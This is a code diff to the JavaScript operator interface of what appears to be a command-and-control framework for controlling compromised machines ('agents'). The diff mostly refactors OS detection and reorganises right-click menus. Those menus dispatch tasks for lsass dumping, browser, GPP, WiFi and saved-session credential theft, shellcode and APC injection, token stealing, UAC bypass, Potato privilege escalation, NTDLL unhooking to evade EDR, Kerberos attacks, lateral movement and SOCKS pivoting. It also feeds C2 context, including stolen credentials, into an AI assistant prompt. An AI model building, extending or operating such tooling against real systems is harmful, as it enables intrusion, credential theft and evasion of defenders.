@@ -4367,6 +4367,8 @@ async function refreshProcessList() {
 
 function renderProcessTableJSON(wrap, procs) {
   if (!procs.length) { wrap.innerHTML = '<div style="padding:20px;color:var(--text3)">No processes found</div>'; return; }
+  const psAgent = agents.find(a => a.id === psAgentId);
+  const psIsWin = isWindowsAgent(psAgent);
   const secFilter = (document.getElementById('ps-filter-input')?.value || '').toLowerCase().trim();
   const shown = secFilter ? procs.filter(p => p.name.toLowerCase().includes(secFilter) || (p.security||'').toLowerCase().includes(secFilter)) : procs;
   let rows = '';
@@ -4377,7 +4379,7 @@ function renderProcessTableJSON(wrap, procs) {
       <td style="padding:4px 6px;font-size:12px">${esc(p.name)}${secBadge}</td>
       <td style="padding:4px 10px;text-align:right;white-space:nowrap">
         <button class="btn btn-ghost btn-sm" onclick="psKill(${p.pid})" title="Kill" style="color:var(--accent-red,#e06c75);font-size:10px">✕ Kill</button>
-        <button class="btn btn-ghost btn-sm" onclick="psInject(${p.pid},'${p.name.replace(/'/g,"\\'")}')" title="Inject" style="font-size:10px">⚡ Inject</button>
+        ${psIsWin ? `<button class="btn btn-ghost btn-sm" onclick="psInject(${p.pid},'${p.name.replace(/'/g,"\\'")}')" title="Inject" style="font-size:10px">⚡ Inject</button>` : ''}
       </td></tr>`;
   }
   wrap.innerHTML = `<div style="padding:4px 10px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:8px">
@@ -4398,7 +4400,7 @@ function renderProcessTableJSON(wrap, procs) {
 async function psKill(pid) {
   if (!psAgentId || !confirm(`Kill PID ${pid}?`)) return;
   const ag = agents.find(a => a.id === psAgentId);
-  const isWin = !ag?.os?.toLowerCase().includes('linux');
+  const isWin = isWindowsAgent(ag);
   const killCmd = isWin ? `taskkill /F /PID ${pid}` : `kill -9 ${pid}`;
   const r = await api('POST', `/api/agents/${psAgentId}/task`, {type:'SHELL', args:killCmd});
   if (r?.ok) { toast(`Kill signal sent to PID ${pid}`); setTimeout(refreshProcessList, 1500); }
@@ -4584,14 +4586,19 @@ function c2ContextMenu(e) {
   const hdr = 'Firewall / C2' + (c2PublicIP ? ' · ' + c2PublicIP : '');
   showCtxMenu(e, [
     {_header: hdr},
-    {label: c2PublicIP ? `🌐  Public IP: ${c2PublicIP}` : '🌐  Public IP: not detected',
-     action: {fn: c2PublicIP ? 'c2CopyPubIP' : 'c2SetPubIP'}},
-    {label: '📋  Copy private IP' + (c2IPs.length > 1 ? 's' : '') + (c2IPs.length ? ` (${c2IPs[0]})` : ''),
-     action: {fn: 'c2CopyPrivIPs'}},
+    ...(c2PublicIP ? [
+      {label: `🌐  Public IP: ${c2PublicIP}`, action: {fn: 'c2CopyPubIP'}},
+    ] : [
+      {label: '🌐  Public IP: not detected — click to set', action: {fn: 'c2SetPubIP'}},
+    ]),
+    ...(c2IPs.length ? [{label: '📋  Copy private IP' + (c2IPs.length > 1 ? 's' : '') + ` (${c2IPs[0]})`,
+      action: {fn: 'c2CopyPrivIPs'}}] : []),
     null,
-    {label: (c2ShowPublicIP ? '✓ ' : '  ') + '🌐  Show public IP on node', action: {fn: 'c2ToggleShowPubIP'}},
-    {label: '✏️  Set public IP…',    action: {fn: 'c2SetPubIP'}},
-    {label: '🗑   Clear public IP',   action: {fn: 'c2ClearPubIP'}},
+    ...(c2PublicIP ? [
+      {label: (c2ShowPublicIP ? '✓ ' : '  ') + '🌐  Show public IP on node', action: {fn: 'c2ToggleShowPubIP'}},
+      {label: '✏️  Set public IP…',  action: {fn: 'c2SetPubIP'}},
+      {label: '🗑   Clear public IP', action: {fn: 'c2ClearPubIP'}},
+    ] : []),
     {label: '🔄  Refresh IPs',        action: {fn: 'c2RefreshIPs'}},
     null,
     {_sub: '⚙️  Graph Appearance', items: [
@@ -4631,6 +4638,15 @@ function c2ContextMenu(e) {
   ]);
 }
 
+function isWindowsAgent(agent) {
+  const os = String(agent?.os || '').toLowerCase().trim();
+  return os.includes('windows') || os.startsWith('win');
+}
+
+function isLinuxAgent(agent) {
+  return String(agent?.os || '').toLowerCase().includes('linux');
+}
+
 // ── Agent row context menu ─────────────────────────────────────────────────────
 function agentContextMenu(e, agentId) {
   const a = agents.find(x => x.id === agentId);
@@ -4638,7 +4654,8 @@ function agentContextMenu(e, agentId) {
   document.querySelectorAll('#agents-tbody tr').forEach(r => r.classList.remove('ctx-active'));
   if (e.currentTarget) e.currentTarget.classList.add('ctx-active');
   const id = agentId;
-  const isWin = !a.os?.toLowerCase().includes('linux');
+  const isWin = isWindowsAgent(a);
+  const isLinux = isLinuxAgent(a);
   showCtxMenu(e, [
     {_header: a.hostname + ' · ' + a.username + (a.ip ? ' · ' + a.ip : '')},
     {label:'📟  Open Console',       action:{fn:'openConsoleFor',   id}},
@@ -4649,8 +4666,15 @@ function agentContextMenu(e, agentId) {
       {label:'ℹ️  Sysinfo',           action:{fn:'selectAndTask', id, type:'SYSINFO',       args:''}},
       {label:'📋  Process List',      action:{fn:'openProcessList', id}},
       {label:'🔑  Whoami / Token',     action:{fn:'selectAndTask', id, type:'TOKEN_WHOAMI',  args:''}},
-      ...(isWin ? [{label:'💾  Dump lsass',         action:{fn:'selectAndTask', id, type:'MINIDUMP',    args:'{}'}}] : []),
     ]},
+    ...(isWin ? [{_sub:'🔐  Credential Access', items:[
+      {label:'💾  Dump lsass (MiniDump)',      action:{fn:'selectAndTask', id, type:'MINIDUMP',       args:'{}'}},
+      null,
+      {label:'🌐  Browser Creds (Chrome/Edge/Brave)', action:{fn:'selectAndTask', id, type:'BROWSER_CREDS',  args:''}},
+      {label:'🗂  GPP Passwords (MS14-025 / SYSVOL)', action:{fn:'selectAndTask', id, type:'GPP_PASSWORDS',  args:''}},
+      {label:'📶  WiFi Passwords',                    action:{fn:'selectAndTask', id, type:'WIFI_CREDS',      args:''}},
+      {label:'🖥  Session Creds (PuTTY/WinSCP/FZ/RDP)', action:{fn:'selectAndTask', id, type:'SESSION_CREDS', args:''}},
+    ]}] : []),
     {_sub:'🔍  Port Scan', items:[
       {label:'Top 100 ports',    action:{fn:'portScan', id, target:a.ip, ports:'21,22,23,25,53,80,88,110,135,139,143,389,443,445,464,593,636,993,995,1433,3268,3306,3389,5985,8080,8443', ms:'300', label:'Top100'}},
       {label:'SMB / AD ports',   action:{fn:'portScan', id, target:a.ip, ports:'88,135,139,389,445,464,593,636,3268,3269,5985,9389', ms:'300', label:'SMB/AD'}},
@@ -4673,6 +4697,9 @@ function agentContextMenu(e, agentId) {
       null,
       {label:'SSH…',               action:{fn:'lateralMove', id, method:'ssh'}},
     ]},
+    ...(isLinux ? [{_sub:'⚡  Lateral Movement', items:[
+      {label:'SSH…',               action:{fn:'lateralMove', id, method:'ssh'}},
+    ]}] : []),
     {_sub:'🔐  Privilege Escalation', items:[
       {label:'🚀 Spawn Agent as User…',     action:{fn:'quickPrivesc', id, act:'spawn-as-user'}},
       {label:'⚡ GetSystem',               action:{fn:'quickPrivesc', id, act:'getsystem'}},
@@ -4683,11 +4710,12 @@ function agentContextMenu(e, agentId) {
       null,
       {label:'UAC bypass (fodhelper)…',   action:{fn:'quickPrivesc', id, act:'fodhelper'}},
       null,
+      {label:'🥔  SeImpersonate → SYSTEM (Potato)…', action:{fn:'potatoPrivesc', id}},
+    ]},
+    {_sub:'🛡  Evasion / Agent Integrity', items:[
       {label:'Hook Check (EDR)',           action:{fn:'selectAndTask', id, type:'HOOK_CHECK',    args:''}},
       {label:'HW Breakpoint Check',        action:{fn:'selectAndTask', id, type:'HW_BP_CHECK',  args:''}},
       {label:'🔓 NTDLL Unhook',            action:{fn:'selectAndTask', id, type:'NTDLL_UNHOOK', args:''}},
-      null,
-      {label:'🥔  SeImpersonate → SYSTEM (Potato)…', action:{fn:'potatoPrivesc', id}},
     ]},
     {_sub:'AD Attacks', _icon:IC_ATTACK_PATHS, items:[
       {_sub:'Rubeus (Kerberos)', _icon:IC_KEY, items:[
@@ -4751,11 +4779,6 @@ function agentContextMenu(e, agentId) {
       {label:'🔄  Screenwatch Start (30s)',   action:{fn:'selectAndTask', id, type:'SCREENWATCH_START', args:'30'}},
       {label:'⏹  Screenwatch Stop',          action:{fn:'selectAndTask', id, type:'SCREENWATCH_STOP',  args:''}},
       null,
-      {label:'🌐  Browser Creds (Chrome/Edge/Brave)', action:{fn:'selectAndTask', id, type:'BROWSER_CREDS',  args:''}},
-      {label:'🗂  GPP Passwords (MS14-025 / SYSVOL)', action:{fn:'selectAndTask', id, type:'GPP_PASSWORDS',  args:''}},
-      {label:'📶  WiFi Passwords',                    action:{fn:'selectAndTask', id, type:'WIFI_CREDS',      args:''}},
-      {label:'🖥  Session Creds (PuTTY/WinSCP/FZ/RDP)', action:{fn:'selectAndTask', id, type:'SESSION_CREDS', args:''}},
-      null,
       {label:'📎  Clipboard (once)',          action:{fn:'selectAndTask', id, type:'CLIP_GET',           args:''}},
       {label:'📋  Clipboard Monitor Start',   action:{fn:'selectAndTask', id, type:'CLIP_MONITOR_START', args:''}},
       {label:'📋  Clipboard Monitor Dump',    action:{fn:'selectAndTask', id, type:'CLIP_MONITOR_DUMP',  args:''}},
@@ -4776,6 +4799,8 @@ function agentContextMenu(e, agentId) {
       {label:'SOCKS5 Stop',         action:{fn:'selectAndTask', id, type:'SOCKS_STOP', args:''}},
       null,
       {label:'📋  List active SOCKS5', action:{fn:'socks5List'}},
+      null,
+      {label:'🌿  Set Parent…',        action:{fn:'setParent',     id}},
     ]},
     null,
     {_sub:'💤  Sleep', items:[
@@ -4789,7 +4814,6 @@ function agentContextMenu(e, agentId) {
     {label:'🪙  Rev2Self',          action:{fn:'selectAndTask', id, type:'REV2SELF',  args:''}},
     {label:'🧹  Cleanup',           action:{fn:'selectAndTask', id, type:'CLEANUP',   args:''}},
     null,
-    {label:'🌿  Set Parent…',        action:{fn:'setParent',     id}},
     {label:'☠  Kill Agent',         action:{fn:'killAgentOnly', id},                           danger:true},
     {label:'🗑  Delete Record',     action:{fn:'deleteAgent',   id},                             danger:true},
   ]);
@@ -4803,16 +4827,20 @@ function processContextMenu(e, pid, name) {
   document.querySelectorAll('.ps-table tr').forEach(r => r.classList.remove('ctx-active'));
   e.currentTarget.classList.add('ctx-active');
   const label = pid + ' — ' + name;
+  const ag = agents.find(a => a.id === aid);
+  const isWin = isWindowsAgent(ag);
   showCtxMenu(e, [
     {_header: label},
-    {label:'💉  Inject shellcode',  action:{fn:'injectModal', id:aid, mode:'remote', pid:String(pid)}},
-    {label:'⚡  Inject APC',        action:{fn:'injectModal', id:aid, mode:'apc',    pid:String(pid)}},
-    {label:'🪙  Steal Token',       action:{fn:'selectAndTask', id:aid, type:'TOKEN_STEAL', args:JSON.stringify({pid:pid})}},
-    {label:'💾  Minidump',          action:{fn:'selectAndTask', id:aid, type:'MINIDUMP',    args:JSON.stringify({pid:pid})}},
+    ...(isWin ? [
+      {label:'💉  Inject shellcode',  action:{fn:'injectModal', id:aid, mode:'remote', pid:String(pid)}},
+      {label:'⚡  Inject APC',        action:{fn:'injectModal', id:aid, mode:'apc',    pid:String(pid)}},
+      {label:'🪙  Steal Token',       action:{fn:'selectAndTask', id:aid, type:'TOKEN_STEAL', args:JSON.stringify({pid:pid})}},
+      {label:'💾  Minidump',          action:{fn:'selectAndTask', id:aid, type:'MINIDUMP',    args:JSON.stringify({pid:pid})}},
+    ] : []),
     null,
     {label:'🔍  Port Scan (local)', action:{fn:'portScan', id:aid, target:'127.0.0.1', ports:'1-1024', ms:'200', label:'Local'}},
     null,
-    {label:'❌  Kill PID',          action:{fn:'selectAndTask', id:aid, type:'SHELL', args:'taskkill /F /PID '+pid}, danger:true},
+    {label:'❌  Kill PID',          action:{fn:'selectAndTask', id:aid, type:'SHELL', args:isWin ? 'taskkill /F /PID '+pid : 'kill -9 '+pid}, danger:true},
   ]);
 }
 
@@ -8060,7 +8088,7 @@ function consoleAcUpdate() {
 
   // Normal command + subcommand completion. Match on trimmed-right value
   // so "socks5 " (trailing space) still suggests "socks5 start", "socks5 stop".
-  const _isWin   = !activeAgent?.os?.toLowerCase().includes('linux');
+  const _isWin   = isWindowsAgent(activeAgent);
   const valTrim  = val.replace(/\s+$/, '');
   const valForPrefix = val.endsWith(' ') ? val : valTrim;
   const prefixMatches = AC_COMMANDS.filter(([c]) => {
@@ -10286,7 +10314,7 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
   if (cmd === 'back') { closeConsole(); return; }
   if (cmd === 'clear' || cmd === 'cls') { clearConsole(); return; }
   if (cmd === 'help') {
-    const _isWin = !agents.find(x=>x.id===agentID)?.os?.toLowerCase().includes('linux');
+    const _isWin = isWindowsAgent(agents.find(x => x.id === agentID));
     if (args) {
       const key = args.trim().toLowerCase();
       const entry = getCmdHelp(key, _isWin);
@@ -13845,7 +13873,7 @@ function fxCloseSession(agentId) {
 async function openFileExplorer(agentId) {
   const a = agents.find(x => x.id === agentId);
   const label = a ? (a.hostname || agentId.substring(0,8)) : agentId.substring(0,8);
-  const isWin  = (a?.os || '').toLowerCase().includes('windows');
+  const isWin  = isWindowsAgent(a);
 
   // Show the console pane and switch to FX view
   document.getElementById('console-pane').classList.add('open');
@@ -13985,7 +14013,7 @@ async function fxList(path) {
   document.getElementById('fx-table').innerHTML = '<div style="padding:24px;color:var(--text3);text-align:center">Loading...</div>';
   try {
     const s = fxSessions.get(fxAgentId);
-    const isWin = s ? (s.os||'').toLowerCase().includes('windows') : false;
+    const isWin = isWindowsAgent(s);
     const authHdr = {'Authorization': 'Bearer ' + (TOKEN || window.__GUI_TOKEN__)};
 
     let url;
@@ -14038,6 +14066,8 @@ function fxRenderTable() {
   const isDrivesView = !fxCurrentPath;
   const isSharesView = fxIsUNCHost(fxCurrentPath);
   const isVirtualRoot = isDrivesView || isSharesView;
+  const fxAgent = agents.find(a => a.id === fxAgentId) || fxSessions.get(fxAgentId);
+  const fxCanExecute = isWindowsAgent(fxAgent);
   const parent = fxParentPath(fxCurrentPath);
   let rows = '';
   if (!isDrivesView && parent !== fxCurrentPath)
@@ -14049,7 +14079,7 @@ function fxRenderTable() {
     const nmQ = esc(e.name).replace(/"/g,'&quot;');
     const icon = isDrivesView ? '💽' : isSharesView ? '🗂' : (e.isDir ? '📁' : fxFileIcon(e.name));
     const ext = e.name.split('.').pop().toLowerCase();
-    const canExec = !e.isDir && !isVirtualRoot && execExts.has(ext);
+    const canExec = fxCanExecute && !e.isDir && !isVirtualRoot && execExts.has(ext);
     rows += `<tr class="fx-row" data-action="${e.isDir||isVirtualRoot?'nav':'dl'}" data-path="${fpQ}" data-name="${nmQ}">
       <td style="padding:5px 12px">${icon}</td>
       <td style="padding:5px 4px;color:var(--text1)">${esc(e.name)}</td>
@@ -14136,11 +14166,12 @@ function fxBgContextMenu(ev) {
 // Right-click on a specific file
 function fxFileContextMenu(ev, remotePath, name) {
   const ext = (name.split('.').pop()||'').toLowerCase();
-  const isExe = ['exe','bat','cmd','ps1','vbs','hta','com','msi'].includes(ext);
+  const fxAgent = agents.find(a => a.id === fxAgentId) || fxSessions.get(fxAgentId);
+  const isExe = isWindowsAgent(fxAgent) && ['exe','bat','cmd','ps1','vbs','hta','com','msi','dll'].includes(ext);
   showCtxMenu(ev, [
     {_header: name},
     {label: '↓   Download',            action: {fn: 'fxDlCtx',  path: remotePath}},
-    {label: '▶   Execute',             action: {fn: 'fxExecCtx', path: remotePath, name}},
+    ...(isExe ? [{label: '▶   Execute', action: {fn: 'fxExecCtx', path: remotePath, name}}] : []),
     null,
     {label: '🗑   Delete',             action: {fn: 'fxDelCtx',  path: remotePath, name}, danger: true},
   ]);
@@ -16527,7 +16558,7 @@ function aicGetConfig() {
 async function aicBuildSystemPromptAsync() {
   const a = agents.find(x => x.id === aicAgentId);
   if (!a) return '';
-  const isWin = !a.os?.toLowerCase().includes('linux');
+  const isWin = isWindowsAgent(a);
 
   // Fetch full C2 context from the server (agents, creds, targets, jobs, activity)
   let c2ctx = '';
